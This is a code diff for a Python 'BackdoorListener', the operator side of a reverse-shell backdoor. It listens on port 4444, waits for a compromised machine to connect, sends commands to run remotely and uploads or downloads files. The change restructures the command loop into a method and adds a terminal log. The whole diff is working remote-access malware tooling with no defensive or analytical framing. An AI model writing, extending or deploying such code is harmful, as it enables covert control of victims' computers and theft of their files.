@@ -21,14 +21,18 @@ def write_file(path, content):
         return "[+] Download successful."
 
 
+# TODO: Add documentation here.
 class BackdoorListener:
+    # TODO: apparently, IP address is not needed. Read more: https://docs.python.org/3/library/socket.html
     def __init__(self, ip_address: str, port: int = 4444):
+        self.terminal = []
         listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener_socket.bind((ip_address, port))
         listener_socket.listen(0)
         print("[+] Waiting for incoming connection...")
         self.connection, address = listener_socket.accept()
+        self.terminal.append(f"[+] Connection established! Source: {address}.")
         print(f"[+] Connection established! Source: {address}.")
 
     def reliable_send(self, data: str):
@@ -48,28 +52,25 @@ class BackdoorListener:
         self.reliable_send(command)
         if command[0] == "exit":
             self.connection.close()
-            exit()
         return self.reliable_receive()
 
-    def run(self):
-        while True:
-            command = input(" >> ")
-            command = command.split()
+    def run_command(self, command):
+        command = command.split()
 
-            try:
-                if command[0] == "upload":
-                    file_content = read_file(command[1]).decode()
-                    command.append(file_content)
+        try:
+            if command[0] == "upload":
+                file_content = read_file(command[1]).decode()
+                command.append(file_content)
 
-                result = self.execute_remotely(command)
+            result = self.execute_remotely(command)
 
-                if command[0] == "download" and "[-] Error " not in result:
-                    result = write_file(command[1], result)
-            except Exception:
+            if command[0] == "download" and "[-] Error " not in result:
+                result = write_file(command[1], result)
+        except Exception:
+            if command[0] == "exit":
+                result = "[+] The exit signal has been sent to target machine."
+            else:
                 result = "[-] Error has occurred during command execution."
 
-            print(result)
-
-
-# listener = BackdoorListener("10.0.2.5", 4444)
-# listener.run()
+        self.terminal.append(result)
+        print(result)
